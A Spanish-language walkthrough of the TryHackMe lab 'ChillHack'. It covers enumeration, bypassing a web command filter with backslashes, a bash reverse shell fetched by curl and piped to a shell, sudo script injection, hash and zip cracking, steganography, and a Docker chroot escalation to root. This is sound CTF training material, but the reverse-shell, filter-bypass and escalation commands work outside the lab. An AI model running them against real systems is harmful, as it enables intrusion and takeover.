# ChillHack – TryHackMe 🧊

ChillHack es una máquina de TryHackMe en la que, tras enumerar el servicio web, conseguimos una shell inversa, realizamos movimiento lateral entre usuarios (incluyendo un pequeño reto de esteganografía) y finalmente escalamos privilegios abusando de Docker. En este writeup documentamos cada paso del proceso.

---

## 1️⃣ Reconocimiento inicial: Ping

Lo primero fue comprobar la conectividad con la máquina víctima usando `ping`:
````bash
ping -c 4 10.80.139.202
````
<img width="668" height="256" alt="Ping" src="https://github.com/user-attachments/assets/6c6d20bb-6e80-4650-88c4-2588b08f6851" />

Obtuvimos respuesta estable de los cuatro paquetes enviados, con **0% packet loss** y tiempos alrededor de **45–73 ms**, lo que confirma que la máquina está activa y accesible en la red ✅.

---

## 2️⃣ Escaneo de puertos con Nmap 🔎

A continuación realizamos un escaneo agresivo de puertos TCP con `nmap`:
````bash
nmap -p- -sV -sC --open -min-rate 5000 -vvv -n -Pn -oN escaneoNmap 10.80.139.202
````

El escaneo reveló los siguientes servicios abiertos:

- 21/tcp: FTP (`vsftpd 3.0.5`) con **login anónimo permitido** 👀  
- 22/tcp: SSH (`OpenSSH 8.2p1`)  
- 80/tcp: HTTP (`Apache 2.4.41` sobre Ubuntu)

Esto nos indica que el primer vector interesante será el servicio **FTP anónimo** y el sitio **web en el puerto 80**.

<img width="1786" height="866" alt="nmap" src="https://github.com/user-attachments/assets/b6430986-9f08-49b8-a73b-bb7bfff68f80" />

---

## 3️⃣ Acceso FTP anónimo y nota inicial 📁

Dado que el puerto 21 (FTP) permitía login anónimo, probamos acceder con:
````bash
ftp 10.80.139.202
Name: anonymous
Password: (dejado en blanco)
````
El login fue exitoso ✅. Listamos el contenido del directorio y vimos un único archivo interesante:
````bash
ls -lah
-rw-r--r-- 1 1001 1001 90 Oct 03 2020 note.txt
````

Descargamos la nota y la leímos localmente:

````bash
get note.txt
exit
cat note.txt
````

El mensaje comentaba que existe **filtrado de cadenas en los comandos**, pista que más adelante será relevante para la explotación.

<img width="883" height="710" alt="ftp" src="https://github.com/user-attachments/assets/cc359ee2-be99-4e6a-a74a-1421b7abf6cd" />
---

## 4️⃣ Enumeración web y directorios ocultos 🌐

Con el puerto 80 abierto, visitamos la web principal:

- URL: `http://10.80.139.202/`
- Página tipo “Game Info” sin funcionalidades claras de entrada (login/register no explotables de momento).

<img width="1506" height="884" alt="pagina puerto 80" src="https://github.com/user-attachments/assets/d3cff57c-1f8e-4106-8cf3-c3607f31ce96" />

Para buscar contenido oculto lanzamos `gobuster`:
````bash
gobuster dir -u http://10.80.139.202
-w /usr/share/wordlists/dirb/common.txt -t 60 -o gobuster.txt
````

El escaneo descubrió varios directorios interesantes, entre ellos:

- `/images`  
- `/js`  
- `/secret` 🔐

Este último será clave para el siguiente paso.

<img width="863" height="567" alt="gobuster" src="https://github.com/user-attachments/assets/86151d36-7afa-446d-a8fa-a7e4e6ab3ef9" />

---

## 5️⃣ Bypass del filtro de comandos en `/secret` 🧠

Al visitar `http://10.80.139.202/secret/` encontramos un campo para ejecutar comandos del sistema.

Inicialmente, comandos directos como:
````bash
ls -la
id
````
estaban filtrados y no se ejecutaban correctamente. Probando distintas formas de evasión, descubrimos que anteponiendo una **barra invertida** (`\`) al comando, el filtro dejaba de bloquearlo:
````bash
\ls -la
\id
````

Así confirmamos:

- El comando `\ls -la` listó el contenido del directorio, mostrando `index.php` y otros recursos.
- El comando `\id` reveló que la ejecución se realiza como el usuario `www-data`:

````bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
````

Esto demuestra que tenemos **Remote Command Execution (RCE)** como `www-data`, lo que será la base para obtener una shell inversa en el siguiente paso 🎯.

<img width="995" height="313" alt="acceso al directorio secret, puedo ejcutar comandos, pero algunos estan bloqueados" src="https://github.com/user-attachments/assets/371169bb-d8b9-4222-a9d6-6efc7d1e7e57" />

<img width="1881" height="260" alt="escapando del filtro con la barra invertida" src="https://github.com/user-attachments/assets/7ad0288d-9b59-440b-bc4d-4176a8183578" />

---

## 6️⃣ Reverse shell como www-data 🐚

Accedemos al codigo fuente de la pagina index:

<img width="1096" height="933" alt="vemos la pagina index php su codigo fuente" src="https://github.com/user-attachments/assets/e04429d8-4d99-4e5b-b3b4-a10f85006300" />

donde nos brinda bastante información al respecto, palabras filtradas, y como podriamos ejuctar un shell.

Para aprovechar el RCE y conseguir una shell inversa, creamos primero un script en nuestra máquina atacante:
````bash
cat Shell.sh
bash -i >& /dev/tcp/192.168.140.51/9001 0>&1
````

Luego levantamos un servidor HTTP sencillo para servir el script:
````bash
python3 -m http.server 8000
````

Y un listener con `nc`:
````bash
nc -nvlp 9001
````

Desde el panel `/secret/`, usamos `curl` (con el truco de la barra invertida) para descargar y ejecutar el script:
````bash
\curl 192.168.140.51:8000/Shell.sh | ba\sh
````

El filtro de palabras prohibidas bloqueaba `bash` y `sh`, pero al escribir `ba\sh` lo **saltamos** con éxito 😈. En el listener recibimos una shell como `www-data`:
````bash
www-data@ip-10-80-139-202:/var/www/html/secret$
````

<img width="858" height="190" alt="creo un shell inverso" src="https://github.com/user-attachments/assets/a68151a2-dcd8-4dea-8fb8-221b30d0c4a8" />

<img width="654" height="217" alt="inserto el script usando curl" src="https://github.com/user-attachments/assets/b70c06d2-2bea-4565-9b18-b4800a604fa1" />

<img width="1854" height="263" alt="obtengo el shell" src="https://github.com/user-attachments/assets/8b0c40ed-6da1-4ec0-8f16-5f643bceae34" />

---

## 7️⃣ Enumeración de /home y descubrimiento de helpline.sh 🏠

Con la shell como `www-data`, comenzamos la enumeración de usuarios locales. Tras revisar `/home`, encontramos el directorio del usuario `apaar` y accedimos a él:
````bash
cd /home/apaar
ls -la
````

En el listado aparecieron dos archivos muy interesantes:

- `.helpline.sh` (script ejecutable por todos: `-rwxrwxr-x`) ⚠️  
- `local.txt` (posible user flag)

<img width="612" height="351" alt="carpeta home apaar" src="https://github.com/user-attachments/assets/71fc8ac8-cf4b-4ab3-be94-46850808c390" />

Al leer el script:
````bash
cat .helpline.sh
````
vimos lo siguiente:
````bash
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person, Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
````

El detalle clave es la línea:
````bash
$msg 2>/dev/null
````

El script **ejecuta lo que el usuario introduzca en la variable `msg`**, lo que puede permitir **ejecución de comandos** cuando se ejecute este script con mayores privilegios.

<img width="733" height="290" alt="leemos el sh" src="https://github.com/user-attachments/assets/2f64895d-6cc9-4c20-be44-76cebdffd20a" />

---

## 8️⃣ Escalada a apaar vía sudo y helpline.sh 🚀

Desde la shell como `www-data` revisamos los permisos sudo:
````bash
sudo -l
````

Vimos que `www-data` puede ejecutar **sin contraseña** el script `.helpline.sh` como el usuario `apaar`:
````bash
(www-data) may run the following commands:
(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
````

<img width="877" height="206" alt="reivsnado permisos de data" src="https://github.com/user-attachments/assets/8a49ac19-43ce-4f5d-82b1-bad39ad918c0" />

Ejecutamos entonces el script como `apaar`:
````bash
sudo -u apaar /home/apaar/.helpline.sh
````

Cuando el script pidió el mensaje, en lugar de texto introdujimos un **comando de sistema**:
````bash
Enter the person whom you want to talk with: /bin/sh
Enter your message: /bin/sh
````

De esta forma, el valor de `msg` fue `/bin/sh` y, al llegar a la línea:
````bash
$msg 2>/dev/null
````

el script ejecutó `/bin/sh`, dándonos una shell como `apaar`. Para mejorarla, usamos:
````bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
````

Ahora sí, comprobamos la identidad:
````bash
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
````

<img width="811" height="264" alt="obtego shell como apaar" src="https://github.com/user-attachments/assets/8d3e0024-1be8-46c2-b191-c7fe412676fd" />

Por último, ya como `apaar`, leímos la **user flag**:
````bash
cat local.txt
````

<img width="495" height="97" alt="obtego User flag" src="https://github.com/user-attachments/assets/4c7211a0-9269-471e-af6c-389e7ea8dbab" />

---

## 9️⃣ Enumeración de puertos locales y uso de LinPEAS 🧩

Ya como `apaar`, continuamos la escalada de privilegios enumerando el sistema. Primero descargamos **LinPEAS** en la máquina víctima:
````bash
wget 192.168.140.51/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
````

<img width="782" height="301" alt="descargo linpeas en el equipo victima" src="https://github.com/user-attachments/assets/9418305d-90b2-43d7-8490-a3f3889a07c9" />

El script resaltó varios **puertos en escucha sólo en localhost**:

- `127.0.0.1:9001`  
- `127.0.0.1:3306` (MySQL)

<img width="1030" height="281" alt="puertos activos interesantes" src="https://github.com/user-attachments/assets/2c7e5bc9-793e-4659-9915-bc5f01d6f96f" />

Para investigar el servicio en el puerto `9001`, hicimos una petición local:
````bash
curl 127.0.0.1:9001
````

La respuesta fue una **página HTML de login** llamada “Customer Portal” con un formulario `username/password`:
````bash
<h2 style="color:blue;">Customer Portal</h2> <h3 style="color:green;">Log In</h3> <form method="POST"> <input type="text" name="username" id="username" placeholder="Username" required> <input type="password" name="password" id="password" placeholder="Password" required> <input type="submit" name="submit" value="Submit"> </form> ```
````

<img width="1535" height="422" alt="obserbvamos respuesta en el puerto 9001" src="https://github.com/user-attachments/assets/0240da0c-e2df-4d6e-9802-02ae66648283" />

Este portal interno sólo accesible desde localhost será clave más adelante para el acceso como otro usuario.

---

## 🔟 Análisis del código del “Customer Portal” y credenciales MySQL 🔐

Sabiendo que el servicio del puerto `9001` mostraba un “Customer Portal”, buscamos sus archivos en el sistema. Desde la cuenta `apaar`:
````bash
cd /var/www/
ls
cd files
ls -lah
````

Encontramos varios archivos web:

- account.php  
- hacker.php  
- images/  
- index.php ✅  
- style.css  

<img width="686" height="330" alt="enumeramos directorio" src="https://github.com/user-attachments/assets/964f2ea8-900e-4a19-ac40-ac4e0fc43eb1" />

El archivo clave era `index.php`, que contiene la lógica de login del portal. Lo abrimos:
````bash
cat index.php
````

Dentro del código vimos cómo se establece la conexión a la base de datos usando **PDO**:
````bash
$con = new PDO("mysql:dbname=webportal;host=localhost","<USUARIO>","<PASSWORD>");
````

<img width="1260" height="869" alt="datos para acceso a bbdd mysql" src="https://github.com/user-attachments/assets/f50aaf42-a561-4359-94b0-05aa184af533" />

De aquí extraemos:

- Nombre de base de datos: `webportal`
- Host: `localhost`
- Usuario y contraseña de MySQL: los que aparecen en la función `new PDO(...)`.

Estas credenciales nos permitirán autenticarnos en MySQL como `apaar` y leer directamente la **tabla de usuarios** utilizada por el “Customer Portal” en el siguiente paso.

---

## 1️⃣1️⃣ Dump de credenciales en MySQL y crack de hashes 🔓

Con las credenciales vistas en `index.php` accedimos a MySQL:
````bash
mysql -u <usuario> -p
show databases;
use webportal;
show tables;
select * from users;
````

La tabla `users` contenía dos entradas con columnas `firstname`, `lastname`, `username` y `password` (en formato **hash**).

<img width="832" height="767" alt="accedo a  mysql y bbdd y tablas obtengo usuarios" src="https://github.com/user-attachments/assets/5a3573b9-10e3-4018-8558-84069dfa30eb" />

Copiamos los hashes de la columna `password` y los enviamos a un servicio de crackeo (por ejemplo, **CrackStation**) que los identificó como **MD5** y devolvió las contraseñas en texto claro ✅.

<img width="1073" height="137" alt="con crackstation descifro claves" src="https://github.com/user-attachments/assets/31607e76-0026-449e-a504-7fae79d2a7c1" />

Probamos una de estas contraseñas para cambiar a otro usuario del sistema (`aurick`):
````bash
cd /home
su aurick
introducimos la contraseña crackeada
````

Sin embargo, la autenticación falló:
````bash
su: Authentication failure
````

<img width="543" height="171" alt="pruebo cmabiar de usuario con la clave y no es esa" src="https://github.com/user-attachments/assets/f7d601a3-8c7a-4a5a-aeba-83d450e88c07" />

Esto nos indica que:

- Las contraseñas del **portal web** no tienen por qué coincidir con las contraseñas de los **usuarios del sistema**.
- Aun así, esas credenciales podrían seguir siendo útiles dentro de la propia aplicación web o para otros servicios (por ejemplo, reuso parcial en algún otro contexto).

---

## 1️⃣2️⃣ Pista en hacker.php, esteganografía y backup.zip 🖼️📦

Volvimos a `/var/www/files` y revisamos `hacker.php`:
````bash
cat hacker.php
````

El código mostraba una imagen concreta y un mensaje:

- “You have reached this far.”
- “Look in the dark! You will find your answer”

La imagen usada era:
````bash
images/hacker-with-laptop_23-2147985341.jpg
````

<img width="973" height="538" alt="vovlemos a files y leemos el hacker php donde hay una pista" src="https://github.com/user-attachments/assets/5bd2394c-6d2b-48b9-9586-8def2e93daee" />

Como sugería “look in the dark”, interpretamos que podía tratarse de **esteganografía**. Levantamos un servidor HTTP en la máquina víctima para descargar la imagen:
````bash
cd /var/www/files
python3 -m http.server 9999
````

Desde nuestra máquina atacante, accedimos al directorio `/images` y descargamos la imagen señalada:

<img width="777" height="416" alt="pongo en esucha servidor para acceder a la imagen" src="https://github.com/user-attachments/assets/b7512e2f-4ef3-44b8-bb89-012151395e25" />

Con la imagen en nuestro equipo, usamos `steghide` para extraer datos ocultos:
````bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Password: (dejado en blanco)
````

La herramienta extrajo un archivo llamado `backup.zip` en el directorio actual:

<img width="689" height="168" alt="uso stehghide y descargo fichero" src="https://github.com/user-attachments/assets/9d3019fe-0df2-4d5c-8350-119863bbffe9" />

Al intentar descomprimirlo:
````bash
skipping: source_code.php incorrect password
````

<img width="601" height="143" alt="intneto descomprimirlo pero requiere password" src="https://github.com/user-attachments/assets/18dd2ae1-1faa-42c5-85f6-d7c1d675ece9" />

---

## 1️⃣3️⃣ Rompiendo backup.zip con John y obteniendo la contraseña de Anurodh 🔑

Como `backup.zip` estaba protegido por contraseña, extraímos su **hash** con `zip2john`:
````bash
zip2john backup.zip > hash
cat hash
````

<img width="943" height="640" alt="descifro la clave y el hash con john" src="https://github.com/user-attachments/assets/610281c3-99ca-45c0-be5b-be1d4e3fd5e6" />

Luego usamos **John the Ripper** con el diccionario `rockyou.txt`:
````bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
````

En pocos segundos John descubrió la contraseña del ZIP ✅.
Con la contraseña ya conocida, descomprimimos:
````bash
unzip backup.zip
[backup.zip] source_code.php password:
cat source_code.php
````

<img width="954" height="952" alt="conseguimos el codigo source_code, y dentro clave para Anurodh" src="https://github.com/user-attachments/assets/8280deda-5bd1-425b-9c13-0f8d9e5ae3ea" />

Dentro de `source_code.php` vimos la lógica de un **Admin Portal**. La parte clave era esta condición:
````bash
if (base64_encode($password) == "<CADENA_BASE64>") {
...
echo "Welcome Anurodh!";
}
````

De aquí deducimos que la contraseña válida es el **valor en texto plano** cuya codificación Base64 coincide con `<CADENA_BASE64>`. Para obtenerla:
````bash
echo "<CADENA_BASE64>" | base64 -d
````

<img width="613" height="83" alt="desciframos la clave de anurodh" src="https://github.com/user-attachments/assets/edcb7413-3491-4478-8282-62070bac2f6e" />

El resultado es la contraseña de **Anurodh**, que utilizaremos para acceder como usuario del sistema en el siguiente paso.

---

## 1️⃣4️⃣ Movimiento lateral a Anurodh y escalada a root vía Docker 🐳👑

Con la contraseña obtenida en el paso anterior, cambiamos al usuario **anurodh**:
````bash
su anurodh
introducimos la contraseña
whoami
id
````

Confirmamos el cambio:

- `whoami` → `anurodh`
- `id` → `uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh), 999(docker)`

<img width="756" height="440" alt="accedo al usuario anudoh" src="https://github.com/user-attachments/assets/b65c9225-5ca0-4e10-a3ac-442456901f94" />

Pertenecer al grupo `docker` permite abusar de **Docker** para escapar al sistema host como `root`. Consultamos GTFOBins para ver una técnica de escalada usando Docker:
````bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
````

<img width="868" height="395" alt="gtfobins docker" src="https://github.com/user-attachments/assets/c5ac7dd5-9d97-4662-9749-930746cecbe3" />

Ejecutamos exactamente ese comando como `anurodh`:
````bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
id
whoami
````

Ahora la salida muestra:

- `uid=0(root) gid=0(root) ...`
- `whoami` → `root`

<img width="898" height="378" alt="escalamos privilegios y obtenemos root flag" src="https://github.com/user-attachments/assets/ddc3db2d-9189-4fb5-bbfd-ac500ff72df4" />

Desde esta shell ya como **root**, accedimos al directorio `/root` para obtener la **root flag**:
````bash
cd /root
ls
cat proof.txt
````

---












































































